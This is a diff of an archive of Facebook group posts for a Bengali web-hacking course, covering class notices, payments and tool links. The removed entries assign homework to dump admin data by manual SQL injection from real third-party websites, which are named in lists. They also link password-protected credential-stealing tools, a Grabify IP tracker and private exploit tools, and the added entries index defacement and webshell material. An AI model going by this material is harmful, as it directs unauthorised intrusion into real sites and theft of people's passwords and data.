+### entry-144 — আপনার ক্লাস টপিক রিলেটেড যে কোন সমস্যা সম্পর্কে এই পোস্টের কমেন্টে স্ক্রিনশট সহ বর্ণনা করুন। পাশা…
 
-Date: unverified · Category: tools · ID: entry-37
+বিষয়:  · তারিখ: যাচাই বাকি · ধরন: information
 
-Join for Havij tools related support
-Closed at 1 AM
-To join the video meeting, click this link:
-[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
-meet.google.com
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-144)
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1608233307545925)
+### entry-146 — LFI to RFI
 
-## ধন্যবাদ সবাইকে, ইন্টারনেট নিয়ে কয়েকজন struggle করলেও খুবই enjoyable একটা সেশন ছিলো আপনাদের সাথে।
+বিষয়: LFI / LFD · তারিখ: যাচাই বাকি · ধরন: information
 
-Date: unverified · Category: information · ID: entry-38
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-146)
 
-ধন্যবাদ সবাইকে, ইন্টারনেট নিয়ে কয়েকজন struggle করলেও খুবই enjoyable একটা সেশন ছিলো আপনাদের সাথে।
-আমাদের পরবর্তী ক্লাস "অনলাইন লোকেশন ট্র‍্যাকিং" এবং অনলাইনের মাধ্যমে কারো তথ্য বের করা।
-সম্পূর্ণ প্রজেক্ট ভিত্তিক ক্লাস। লাইভ ক্লাস মিস করবেন না।
-দেখা হচ্ছে ক্লাসে, ইনশাআল্লাহ।
-আজকে ১১ টা ৩০ থেকে ১২ টা পর্যন্ত আলাদা একটা one2one support session হচ্ছে। যদি কারো টুলস কিংবা ক্লাস ওয়ার্ক সম্পর্কিত সমস্যা থাকে, সাপোর্ট সেশন থেকে সাপোর্ট নিয়ে নিন। ধন্যবাদ।
+### entry-148 — WordPress Backup, Wordfence Malware Scan ও XAMPP Lab
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1608227137546542)
+বিষয়: WordPress · তারিখ: 2026-10-04 · ধরন: recordings
 
-## Submit 3 SQLi site link with screenshot...
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-148)
 
-Date: unverified · Category: documents · ID: entry-41
+### msg-hw5-xss — XSS — Homework Task 5 (HW5.pdf)
 
-Submit 3 SQLi site link with screenshot...
-https://docs.google.com/document/d/129j6c7u1S-e6atUbnlis50Cnpm3qtrHaKP_KSENe_eo/edit?usp=sharing
-docs.google.com
-Submit 3 SQLi site link with screenshot
+বিষয়: XSS · তারিখ: 2026-08-09 · ধরন: documents
 
-### Notes
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/msg-hw5-xss)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/documents/hw5-xss-public.pdf)
 
-Dump the data of any three websites from here
+### msg-deface-example — Deface Page — HTML অনুশীলন ফাইল
 
+বিষয়: WebShell · তারিখ: 2026-08-21 · ধরন: documents
 
-Google Dork
-	Site Links
-	php?id= site:
-	http://www.ingenium.co.th/
-	php?id= site:
-	http://www.embryohotel.com/
-	php?id= site:
-	https://www.pupilbooks.in/
-	php?id= site:
-	http://polymat.co.th/
-	php?id= site:
-	http://www.meridianhotel.co.ug/
-	php?id= site:
-	http://csi-india.org/
-	php?id= site:
-	http://www.cmkoo.com.hk/
-	php?id= site:
-	http://native.edu.pk/
-	php?id= site:
-	http://www.igoergo.com/
-	php?id= site:
-	http://www.pkw.ac.th/
-	
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/msg-deface-example)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/documents/deface-class-example.zip)
 
+### msg-wp-migration — WordPress Backup — All-in-One WP Migration 7.48
 
+বিষয়: WordPress · তারিখ: 2026-10-04 · ধরন: tools
 
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/msg-wp-migration)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/tools/all-in-one-wp-migration-7.48.zip)
 
+### tool-wordfence — Wordfence 9.0.2 — WordPress Security Scan
 
-Example of homework PDF
+বিষয়: WordPress · তারিখ: যাচাই বাকি · ধরন: tools
 
-- [Resource](https://docs.google.com/document/d/129j6c7u1S-e6atUbnlis50Cnpm3qtrHaKP_KSENe_eo/edit?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1608246277544628)
-
-## চলুন কম্পিউটার নিয়ে একটু জেনে আসি!!
-
-Date: unverified · Category: information · ID: entry-42
-
-চলুন কম্পিউটার নিয়ে একটু জেনে আসি!!
-File Extension
-ফাইলঃ
-গ্রুপে অনেককেই দেখি জিপ ফাইল এর উপর ডাবল ক্লিক করে টুলস গুলো রান করার চেষ্টা করেন।যার ফলে প্রকৃতপক্ষে টুলসগুলো রান করতে না পেরে আপনারা ঘাবড়ে যান। আসুন এখন জেনে নেই জিপ ফাইল কি জিনিস? জিপ ফাইলকে আমরা একটি ডিমের উপরের আবরণ এর সাথে তুলনা করতে পারি। ডিমের উপরের আবরণ যেমন ভেতরের ডিমের অংশটুকু কে সুরক্ষিত রাখে অথবা তার আবরণ দ্বারা ডিমের অংশটুকু কে যেভাবে ঢেকে রাখে ঠিক সেভাবেই একটি জিপ ফাইল তার ভেতরের যে কোন ফোল্ডার টুলস সফটওয়্যার যেকোনো এক্সটেনশন এর ফাইলকে জিপের ভিতর আবদ্ধ রাখে এবং ভিতরের ফাইলগুলোকে সুরক্ষিত রাখে। যার ফলে এই ফাইলগুলোকে খুব সহজেই গুগল ড্রাইভ অথবা অন্যান্য ফাইল শেয়ারিং এর মাধ্যমে শেয়ার করা সহজ হয় এবং কোন এন্টিভাইরাস অথবা ভাইরাস প্রটেকশন ভেতরের ফাইলগুলোকে ডিটেক্ট অথবা নষ্ট করতে পারেনা।
-ফাইল সম্পর্কে তো আপনাদের ধারনা আছেই, তাও ছোট করে একটু বলি-
-ফাইল হলো একটি নাম যার মাধ্যমে ষ্টোরেজ ডিবাইসে কোন তথ্য সংরক্ষন করা হয়।
-ফাইল নেইম এর ২টি পার্ট থাকে, তার একটি হলো সাধারন নাম ( সাধারনত ডাটা সম্পর্কিত নাম) এবং অন্যটি হলো এক্সটেনশন (মূলত ফাইল টাইপ বা ফরমেট কে বোঝার জন্য)।
-মনে করুন আপনি ওয়ার্ডে একটি সিভি(বায়োডাটা) টাইপ করলেন, সেটা পরবর্তিতে পাওয়ার জন্য ষ্টোর করবেন, তাহলে এই ফাইলটিকে সেইভ করতে হবে মানে কোন ষ্টোরেজ ডিভেইসে সংরক্ষন করতে হবে, তাহলেই প্রয়োজন হবে একটি ফাইল নেইম এর।
-সেভ করার জন্য নরমালী আপনি কি নাম দিবেন?? যদি আমি হতাম তাহলে এই টাইপ দিতাম Ahaque_CV বা Aminul_CV বা CV_Amin । যেহেতু আমি এমএসওয়ার্ডে (MS-WORD) ফাইলটি করে সেইভ করেছি তাই অটোমেটিক ফাইল নেইম এর সাথে .docx টি যুক্ত হয়ে গেছে।
-তাহলে পুরো ফাইলটির নাম দাড়ালো- Ahaque_cv.docx বা Cv-Amin.docx
-এক্সেটনশনটি বলে দিচ্ছে যে এই ফাইলটি ডকুমেন্ট ফাইল বা ওয়ার্ড ডকুমেন্ট ফাইল, এটি ওপেন করার জন্য ওয়ার্ড পোগ্রামটি লাগবে। সাপোস আপনার বাসায় প্রিন্টার নেই, আপনার বন্ধুর বাসায় বা কোন দোকানে গিয়ে প্রিন্ট করবেন তাই ফ্লাশ মেমোরীতে কপি করে নিয়েছেন, তাহলে আপনার বন্ধুর পিসিতে বা দোকানের পিসিতে ওয়ার্ড পোগ্রামটি লাগবে।
-এখানে একটি বিষয় বলে রাখা ভালো যে- আপনি সিভিটি সুন্দর করতে গিয়ে অনেক সুন্দর সুন্দর ফন্ট ব্যবহার করেছেন, কিছু ফরমেট এবং পেইজ সাইজ পরিবর্তন করেছেন. উইএসবি মেমোরীতে নিয়ে আসা ঐ ওয়ার্ড ফাইলটি আপনার বন্ধুর পিসি ওপেন করলে লেখা ও ফরমেট একটু এদিক-সেদিক হয়ে যেতে পারে, সেক্ষেত্রে- আপনার ওয়ার্ডে করা ফাইলটি যদি pdf (portable document format) ফরমেটে সেইভ করেন তাহলে এই আর এই প্রবলেম হবেনা(যদিও প্রয়োজন হলে তথ্য পরিবর্তন করতে পারবেন না) এই ক্ষেত্রে ফাইল নাম টি দাড়ালো - Ahaque_cv.pdf বা Cv-Amin.pdf
-এখন এই ফাইল টি ওপেন করার জন্য যে কোন পিডিএফ রিডার (Acrobat reader,….) এমন কি ব্রাউজারের মাধ্যমেও ওপেন করতে পারবেন।
-ফাইল এক্সটেনশনঃ
-ফাইল এক্সটেনশন কি জানার আগে আমাদের জানতে হবে এক্সটেনশন এর মানে কি? এক্সটেনশন এর বাংলা করলে যা পাওয়া যায় তা হলো- প্রসার,বিস্তার,সংযোজিত অংশ ইত্যাদি।
-এই থেকে বলা যায় ফাইল এক্সটেনশন হলো ফাইলের সাথে থাকা সংযোজিত একটা অংশ যার মাধ্যমে ফাইল টির ধরন জানা বা বোঝার জন্য তা সংযুক্ত করা হয়।এই ফাইল এক্সটেনশন দেখে ফাইল টাইপ বা কোন পোগ্রাম এর তা জানা যায়।।
-মূল নামের পর একটি ডট(.) দিয়ে যে নামগুলো থাকে সেটাই এক্সটেনশন।
-অপনার পিসিতে যদি ফাইল নেম এর পরে এক্সটেনশন দেখা না যায় তাহলে- ছবিগুলো ফলো করুন, তাহলেই চলে আসবে আপনার ফাইল এক্সটেনশন।
-এখন কিছু এক্সটেনশন কোন টাইপের তা জেনে নেয়া যাক-
-ছবি রিলেটেড যত এক্সটেনশন-
-.jpeg or .jpg – JPEG image
-.png – PNG image
-.bmp – Bitmap image
-.tif or .tiff – TIFF image
-.gif – GIF image
-.ico – Icon file
-.psd – PSD Photoshop File
-.ai – Adobe Illustrator file
-.svg – Scalable Vector Graphics file
-ইন্টারনেট রিলেটেড যত এক্সটেনশন-
-.htm and .html – HTML file
-.asp and .aspx – Active Server Page file
-.php – PHP file
-.cer – Internet security certificate
-.cfm – ColdFusion Markup file
-.cgi or .pl – Perl script file
-.css – Cascading Style Sheet file
-.js – JavaScript file
-.jsp – Java Server Page file
-.part – Partially downloaded file
-.py – Python file
-.rss – RSS file
-.xhtml – XHTML file
-অডিও রিলেটেড যত এক্সটেনশন
-.mp3 – MP3 audio file
-.mpa – MPEG-2 audio file
-.ogg – Ogg Vorbis audio file
-.wav – WAV file
-.wma – WMA audio file
-ভিডিও ফাইল টাইপ যত এক্সটেনশন
-.3gp – 3GPP multimedia file
-.mp4 – MPEG4 video file
-.mpg or .mpeg – MPEG video file
-.avi – AVI file
-.flv – Adobe Flash file
-.h264 – H.264 video file
-.m4v – Apple MP4 video file
-.mkv – Matroska Multimedia Container
-.mov – Apple QuickTime movie file
-.rm – RealMedia file
-.swf – Shockwave flash file
-.vob – DVD Video Object
-.wmv – Windows Media Video file
-ফাইল কমপ্রেশন টাইপ যত এক্সটেনশন
-.rar – RAR file
-.7z – 7-Zip compressed file
-.zip – Zip compressed file
-.arj – ARJ compressed file
-.deb – Debian software package file
-.pkg – Package file
-.rpm – Red Hat Package Manager
-.tar.gz – Tarball compressed file
-.z – Z compressed file
-এপ্লিকেশন টাইপ যত এক্সটেনশন-
-.apk – Android package file
-.exe – Executable file
-.com – MS-DOS command file
-.msi - installer package file format used by Windows.
-.bat – Batch file
-.bin – Binary file
-.cgi or .pl – Perl script file
-.jar – Java Archive file
-ডকুমেন্টেশন টাইপ যত এক্সটেনশন-
-.doc and .docx – Microsoft Word file
-.pps – PowerPoint slide show
-.ppt – PowerPoint presentation
-.pptx – PowerPoint Open XML presentation
-.xls – Microsoft Excel file
-.xlsx – Microsoft Excel Open XML spreadsheet file
-.pdf – PDF file
-.rtf – Rich Text Format
-.txt – Plain text file
-ইত্যাদি।।
-পরবর্তিতে সময় পেলে আরো কিছু সংযুক্ত করবো...
-=! নিচের দুটি ছবিতে জিপ ফাইল ডাবল ক্লিক করে রান করার চেষ্টা করা হচ্ছে! এক্ষেত্রে প্রথমে জিপ ফাইলের উপর রাইট ক্লিক করে এক্সট্র্যাক্ট করতে হবে।
-=! যদি ফাইল নেম এবং এক্সটেনশন দেখা না যায় তবে শেষের ছবিটি লক্ষ্য করুন ভিউ থেকে ফাইল নেম এবং এক্সটেনশন টিক মার্ক দিয়ে নিবেন ধন্যবাদ...!
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1608248120877777)
-
-## OSINT — B66 Delta
-
-Date: 2026-07-26 · Category: documents · ID: entry-43
-
-ডিরেক্ট ক্লাস রিসোর্স লিংক
-OSINT - B66 Delta
-
-### Notes
-
-Imp post: https://www.facebook.com/groups/awsb66delta/posts/1609893780713211
-HW: https://forms.gle/fPiaspqK6eU3vibL7
-
-
-
-
-OSINT -
-
-
-সবাই পোর্টালে লগিন করে উপস্থিতি দিয়ে দিন। 
-প্রথমে https://hw.arenaclass.stream/  আপনার একাউন্ট দিয়ে প্যানেলে লগিন করুন। উল্লেখ্য, আপনি হোমওয়ার্ক জমা দেওয়ার জন্য যেই আইডি পাসওয়ার্ড দিয়ে লগিন করেন সেটাই student panel.
-
-
-এরপর join class এ ক্লিক করুন। take attendance এ ক্লিক করলেই উপস্থিতি জমা হয়ে যাবে।
-
-
-
-
-1.1
-—----------------------------------------------------------------------------------------
-Your ip: https://whatismyipaddress.com/
-Track: https://grabify.link/
-
-Ip2Loc: https://whatismyipaddress.com/ip-lookup
-
-
-Video: https://drive.google.com/file/d/19kNyR9LPDIAnq4EvsKzZOqvD6xTtJBjF/view?usp=drive_link
-—----------------------------------------------------------------------------------------
-
-
-
-
-1.2
-—----------------------------------------------------------------------------------------
-Notice: https://hackerinstitutebd.blogspot.com/2024/08/blog-post.html
-—----------------------------------------------------------------------------------------
-
-
-1.3
-—----------------------------------------------------------------------------------------
-https://whois.domaintools.com/      amardesh.com
-Bdia btcl
-Wayback machine
-—----------------------------------------------------------------------------------------
-
-
-tanjim@arenawebsecurity.net
-ceo@arenawebsecurity.net
-
-
-1.4:
-—----------------------------------------------------------------------------------------
-URL: https://www.dainikcoxsbazar.com/
-CW: [সীমিত প্রবেশাধিকার]
-
-
-—----------------------------------------------------------------------------------------
-
-- [Resource](https://docs.google.com/document/d/1PVu1YmjTLqqe5ZToj9tb8fErVG36hUUxxVlHmNh9rZE/edit)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1609800807389175)
-
-## সবাই ক্লাসে চলে আসুন।
-
-Date: unverified · Category: information · ID: entry-44
-
-সবাই ক্লাসে চলে আসুন।
-posted to
-Admin
-·
-OSINT - B66 Delta
-
-- [Resource](https://www.facebook.com/groups/awsb66delta/)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1609800030722586)
-
-## OSINT - B66 Delta
-
-Date: unverified · Category: information · ID: entry-45
-
-OSINT - B66 Delta
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1609799717389284)
-
-## কি এক্ট্যা অবস্থা !!!
-
-Date: unverified · Category: information · ID: entry-48
-
-কি এক্ট্যা অবস্থা !!!
-আপনার কাছের কেউ যদি আপনার ওয়াই-ফাই পাসওয়ার্ড বা মেইলের পাসওয়ার্ড চুরি করে আপনারই সামনে বসে,
-বলেন তো কি এক্টা অবস্থা??
-ব্রাউজারের সেইভড্‌ পাসওয়ার্ডঃ
-ব্রাউজারে পাসওয়ার্ড সেইভ রাখার যেমন সুবিধা আছে আবার আছে ঠিক তার উল্টো ইফেক্ট।
-মনে করুন, আপনার কোন বন্ধু বা কোন আত্মীয় আসলো আপনার বাসায়, এর পর কোন প্রয়োজনে তার মেইল চেক করতে চাইলো বা আপনার বন্ধুটি আপনার পিসিতে গেম খেলতে বসলো, আপনি কি মানা করতে পারবেন?
-অথবা আপনার বাসার আশে পাসের কোন প্রতিবেশী আসলো, আর সে তার উইনিভার্সিটি তে কোন ফরর্ম ফিলাপ করবে, এখন কি আপনি তাকে মানা করতে পারবেন?
-স্বাভাবিক ভাবেই উত্তর হলো না।
-এখন সে যদি আপনার পিসি থেকে সব সেইভ করা পাসওয়ার্ড রিট্রিভ করে তার মেইলে পাঠিয়ে দেয় বা তার পেনড্রােইভে কপি করে নিয়ে যায় বলেন তো কি এক্ট্যা অবস্থ্যা!!!
-আমরা বিভিন্ন সময়ে বিভিন্ন সাইটে লগ-ইন করি, সেময় অনেক সাইটের পাসওয়ার্ড আমারা ব্রাউজারে সেইভ করে রাখি। এটা যেমন সুবিধা (পাবর্তিতে ঐ সাইট যেমন- জিমেইল বা ফেসবুক) এ লগ-ইন করার ঝামেলা থাকে না তেমনি অসুবিধা হলো আমার ডিভাইস টি তে অন্য কেহ বসলে সে- আমার পাসওয়ার্ড গুলো পেয়ে যেতে পারে। আবার এমন ও হতে পারে আমার/ আপনার পিসি হ্যাক হলে হ্যাকার পিসি থেকে ঐ সব ডাটা(ইউজার ও পাসওয়ার্ড) নিয়ে নিতে পারে। সেক্ষেত্রে ব্রাউজারে পাসওয়ার্ড সেইভ না রাখাই ভালো।
-তবে জি-মেইল এবং ফেসবুক তো আমার প্রতিদিন ই ওপেন করি, তাই সেটা সেইভ রাখাটাও জরুরী। সেক্ষেত্রে জি-মেইল এবং ফেসবুকে ২-ফ্যাক্টর অথেন্টিকেশন অন-করে রাখা ভালো। সেটা নিয়ে পরবর্তিতে একটি পোষ্ট দিবনে।
-ব্রাউজার এ সেইভ পাসওয়ার্ড দেখার জন্য অনেক রকম ইউটিলিটি আছে, তা দিয়েই পিসির ব্রাউজারের সেইভ করা পাসওয়ার্ডগুলো দেখা যায়।
-যেমনঃ browser password decryptor , আমাদের Learn with Cyber 71 গ্রুপে এবং ইউটিউভ চ্যানেলে দেখেছেন. যারা সেটি দিয়ে এখনও ট্রাই করছেন তারা মেবী একটি সমস্যা নোটিশ করেছেন যে সাইট এবং ইউজার নেইম শো করছে কিন্তু পাসওয়ার্ড শো করছে না। তার কারন হলো ব্রাউজার গুলো আপডেট হয়েছে তাই আপডেটেড ব্রাউজারের সাথে সফ্টওয়্যারটির ডাটা রি-কল লোকেশনের একটু এদিক-সেদিক হয়ে গেছে।
-সমস্যা নেই আমি, অন্য একটি এ্যাপ দিচ্ছি সেটা দিয়ে ট্রাই করতে পারেন।
-https://drive.google.com/file/d/1oUm1cRDQ1eH4VfjWUhA6rSJrYUACQq5J/view
-Password: aws
-আপনার পিসিতে কানেক্ট হওয়া সব ওয়াই-ফাই পাসওয়ার্ডঃ
-আগে উইন্ডোজ 7 বা তারও আগের পিসিতে ষ্টেটাসবারে থাকা কানেকশনের প্রোপার্টিজ থেকে পাসওয়ার্ড টা দেখা যেতো, এখন উইন্ডোজ 10. 11 এই অপশনটি নেই। তারপরও যাদের পাওয়ার শেল বা ডস কমান্ডে ভালো ধারনা আছে তারা বের করতে পারেন, সেক্ষেত্রেও বেশ ঝামেলা আছে।
-এবার আমি আরো একটি টুলস্ দিচ্ছি সেটা থেকে তাও রেব করে নিতে পারবেন।
-উইন্ডোজ 10 ৬৪ বিটের হলেঃ https://drive.google.com/file/d/1VhplhDCOGV4f709rRKzysbSQKgwUFRRJ/view
-Password: aws
-বিশেষ দ্রঃ আপনি আবার এই আন-ইথিক্যাল কাজটি করে বসেবেন না যেন। মোবাইল রিসেট করেছেন, বা রাউটার রিসেট করেছেন বা আপনার ওয়াইফাই পাসওয়ার্ড ভুলে গেছেন, এখন বন্ধু কে দিতে হবে সেক্ষেত্রে পিসি থেকে এই টুলস্‌ দিয়ে পাসওয়ার্ডটি বের করে নিতে পারেন।
-পাশের বাসার আপুর পিসিতে বসে আবার এপ্লাই করতে যাইয়েন না!
-
-- [Resource](https://drive.google.com/file/d/1oUm1cRDQ1eH4VfjWUhA6rSJrYUACQq5J/view)
-- [Resource](https://drive.google.com/file/d/1VhplhDCOGV4f709rRKzysbSQKgwUFRRJ/view)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1610714410631148)
-
-## Extra support session will start from 7:00 PM
-
-Date: unverified · Category: tools · ID: entry-50
-
-Extra support session will start from 7:00 PM
-Get
-CyberFox
-tools related support before starting the class. To join the video meeting, click this link:
-[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
-meet.google.com
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1612996040402985)
-
-## CyberFox for Mac.txt
-
-Date: 2026-07-31 · Category: information · ID: entry-51
-
-Text
-CyberFox for Mac.txt
-
-### Notes
-
-https://classic.waterfox.net/								Cyberfox Alternative
-https://drive.google.com/file/d/11rlRdQ_JZNbij2ie1TaMt4YHQ9vq4x-o/view			HackBar Addons
-
-https://theunarchiver.com/								for zip extraction if need!
-https://drive.google.com/file/d/1EC-eNnWwfzTXn0eISqG7GLVa3rn9Wnsq/view?usp=drive_link	Setup tutorial
-
-- [Resource](https://www.facebook.com/download/1074110211846797/CyberFox%20for%20Mac.txt)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1612892513746671)
-
-## Arena private Campus directory
-
-Date: unverified · Category: information · ID: entry-52
-
-সীমিত প্রবেশাধিকারযুক্ত কোর্স রিসোর্স। পাসওয়ার্ড ও ব্যক্তিগত লিংক পাবলিক আর্কাইভে প্রকাশ করা হয়নি।
-
-
-## সবাই ক্লাসে চলে আসুন।
-
-Date: unverified · Category: information · ID: entry-53
-
-সবাই ক্লাসে চলে আসুন।
-posted to
-Admin
-·
-Session hijacking / Blocking, Mid Exam prep
-
-- [Resource](https://www.facebook.com/groups/awsb66delta/)
-
-## Session hijacking / Blocking, Mid Exam prep
-
-Date: unverified · Category: information · ID: entry-54
-
-Session hijacking / Blocking, Mid Exam prep
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614142453621677)
-
-## গুরুত্বপূর্ণ নোটিশঃ দ্বিতীয় ইন্সটলমেন্ট সংক্রান্ত পোস্ট, ১০% জরিমানা এবং সাসপেনশন এড়াতে ২য় ইন্সটল…
-
-Date: unverified · Category: notices · ID: entry-55
-
-গুরুত্বপূর্ণ নোটিশঃ দ্বিতীয় ইন্সটলমেন্ট সংক্রান্ত পোস্ট, ১০% জরিমানা এবং সাসপেনশন এড়াতে ২য় ইন্সটলম্যান্ট পরিশোধ করে নিন।
-
-যারা ২য় ইন্সটলম্যান্ট পেমেন্ট করেছেন (এডমিশনের সময় যারা 'FULL PAYMENT' করেছেন, তাদের আর কিছু করতে হবে না) তারা ইমেইল না পেয়ে থাকলে এই পোস্টে জানাবেন।
-
-আর বাকি যারা আছেন, তারা ২য় ইন্সটলম্যান্ট পরিশোধের পর নিন্মোল্লেখিত পেমেন্ট হটলাইনে হোয়াটসঅ্যাপে ম্যাসেজের মাধ্যমে CONFIRMATION নিয়ে নিবেন। 01324176402 (ONLY PAYMENT HOTLINE, WHATSAPP) পেমেন্টের স্ক্রিনশট বা সামারি সহ ম্যাসেজ করবেন।
-
-অথবা এরিনা ওয়েব সিকিউরিটির ফেসবুক পেজেও যোগাযোগ করে নিতে পারেন। WWW.FACEBOOK.COM/ARENABANGLADESH
-
-পেমেন্টের যাবতীয় তথ্যাবলী আপনার স্টুডেন্ট পোর্টালে HTTPS://HW.ARENACLASS.STREAM লগিন করে 'PAY NOW' অপশনে ক্লিক করলে পেয়ে যাবেন।
-
-> আপনি বিকাশের মাধ্যমে পোর্টাল থেকেই সরাসরি পেমেন্ট করে দিতে পারছেন(সেক্ষেত্রে আর ম্যাসেজ করার প্রয়োজন নেই, পরেরদিন অফিস সময়ে ইমেইলে সকল কনফারমেশন পেয়ে যাবেন)।
-
-> এছাড়া ম্যানুয়ালী বিকাশ/রকেট/নগদ/ব্যাংক এর মাধ্যমে পেমেন্ট করতে চাইলে নিচে আইকন গুলোতে ক্লিক করলে আপনি পেমেন্টের ডিটেইলস পেয়ে যাবেন। ম্যানুয়ালি পেমেন্ট কমপ্লিট করার পর অবশ্যই WHATSAPP এ পেমেন্ট ডিটেইলস সহ ম্যাসেজ করে দিবেন।
-
-দেশের বাইরে থেকে যারা পেমেন্ট করতে চান কিংবা ম্যানুয়াল পেমেন্ট করতে চান তাদের জন্য তথ্যঃ MANUAL PAYMENT DETAILS:
-
-HTTPS://DOCS.GOOGLE.COM/DOCUMENT/D/1L093GBZBOOWWHAQN8GENA9KKHPIWTUJCKOYZ7K1SIHS/PREVIEW
-
-পোর্টাল থেকে পেমেন্টের বিস্তারিত নিচে প্রদত্ত ছবিতে দেওয়া আছে। @EVERYONE
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614265676942688)
-
-## Gift for AWS Batch 66 Delta
-
-Date: unverified · Category: documents · ID: entry-56
-
-Gift for AWS Batch 66 Delta
-E-book copy:
-PDF copy:
-
-- [Resource](https://cybernirapotta.arenawebsecurity.net/)
-- [Resource](https://shorturl.at/ZVBbu)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614259826943273)
-
-## যাদের cyberfox রিলেটেড ইস্যু আছে তারা এই লিংকে জয়েন করুন
-
-Date: unverified · Category: information · ID: entry-57
-
-যাদের cyberfox রিলেটেড ইস্যু আছে তারা এই লিংকে জয়েন করুন
-meet.google.com/esk-jxss-ivm
-সাপোর্ট চলবে রাত ১১:৪৫ মিনিট পর্যন্ত
-Closed : 1:00 AM
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614232903612632)
-
-## CYBER-71 private exploit tools
-
-Date: unverified · Category: tools · ID: entry-59
-
-সীমিত প্রবেশাধিকারযুক্ত কোর্স রিসোর্স। পাসওয়ার্ড ও ব্যক্তিগত লিংক পাবলিক আর্কাইভে প্রকাশ করা হয়নি।
-
-
-## VIDEO FOR NO-REDIRECT
-
-Date: unverified · Category: classes · ID: entry-60
-
-VIDEO FOR NO-REDIRECT
-ফাইনালী সাথে একটি পুরনো ভিডিও সংযুক্ত করে দিলাম
-( ভিডওটি ব্যাচ-২২ এর সময়ে, এখানে যে এক্সপ্লয়েটটি দেখানো হয়েছে সেটি পুরনো, নতুন এক্সপ্লোয়েটটি হ্যাকবারের সাথেই দেয়া আছে।)
-ভিডিও এর HD Quality Copy - https://drive.google.com/file/d/1VA3BG_TVIl9yLDSDiIMGwTP2aVvPLgff/view
-Enjoy video
-0:00 / 0:00
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614257150276874)
-
-## Manual SQL Injection
-
-Date: unverified · Category: information · ID: entry-61
-
-Manual SQL Injection
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1615883486780907)
-
-## আপনাদের হোমওয়ার্ক:
-
-Date: unverified · Category: documents · ID: entry-63
-
-আপনাদের হোমওয়ার্ক:
-যে কোন পাঁচটি সাইট ম্যানুয়ালি এসকিউএল ইনজেকশন এর মাধ্যমে এডমিনের ইনফরমেশন ডাম্প করা। এখন আপনি চাইলে নিজে থেকে সাইট খুঁজে নিয়ে কাজ করতে পারেন অথবা এখানে দশটি সাইট রয়েছে এখান থেকেও যেকোন পাঁচটি করে নিতে পারবেন ধন্যবাদ।
-https://docs.google.com/document/d/1nFaeFgkMQ6EN0SXgnOKax06xKqMsVIMdFTabBcUaEp4/edit?usp=sharing
-docs.google.com
-Submit 5 manual SQLi sites link with screenshot
-
-### Notes
-
-Manual dump the data of any five websites from here
-
-
-Google Dork
-	Site Links
-	php?id= site:
-	https://aueqi.in/
-	php?id= site:
-	https://native.edu.pk/
-	php?id= site:
-	https://www.xeroflor.sg/
-	php?id= site:
-	https://www.cr-led.com/
-	php?id= site:
-	https://www.igoergo.com/
-	php?id= site:
-	https://www.ncbms.edu.pk/
-	php?id= site:
-	https://www.cmkoo.com.hk/
-	php?id= site:
-	https://www.fsaijazuddin.pk/
-	php?id= site:
-	http://www.meridianhotel.co.ug/
-	php?id= site:
-	http://www.diamondhills.com.pk/
-	
-
-
-
-
-
-Example of homework PDF
-
-- [Resource](https://docs.google.com/document/d/1nFaeFgkMQ6EN0SXgnOKax06xKqMsVIMdFTabBcUaEp4/edit?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1615964790106110)
-
-## CyberFox ultimate version
-
-Date: 2026-07-31 · Category: information · ID: entry-65
-
-CyberFox ultimate version
-drive.google.com
-CyberfoxP.rar
-
-- [Resource](https://drive.google.com/file/d/1kFA53LckLr9ljMuWKGslQ45NXK_i2X25/view?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1615969903438932)
-
-## Manual SQLI practice video
-
-Date: unverified · Category: classes · ID: entry-66
-
-Manual SQLI practice video
-0:00 / 0:00
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1615969490105640)
-
-## যারা ২য় ইন্সটলম্যান্ট পেমেন্ট করেছেন তারা ইতিমধ্যেই ইমেইলে কনফার্মেশন পেয়ে গেছেন, কেউ কনফার্মেশন …
-
-Date: unverified · Category: notices · ID: entry-67
-
-যারা ২য় ইন্সটলম্যান্ট পেমেন্ট করেছেন তারা ইতিমধ্যেই ইমেইলে কনফার্মেশন পেয়ে গেছেন, কেউ কনফার্মেশন না পান কিংবা পোর্টালে আপডেট না হয় ইমেইলটা পুনরায় চেক করে অবশ্যই আজকের মধ্যে ইমেইলে যোগাযোগ করে নিন।
-২য় ইন্সটলম্যান্ট পরিশোধের নিয়ম পিন পোষ্টেই দেওয়া আছে, কমেন্টেও সংযুক্ত করে দেওয়া হচ্ছে। ধন্যবাদ।
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1616417463394176)
-
-## Manual SQL Injection practice output
-
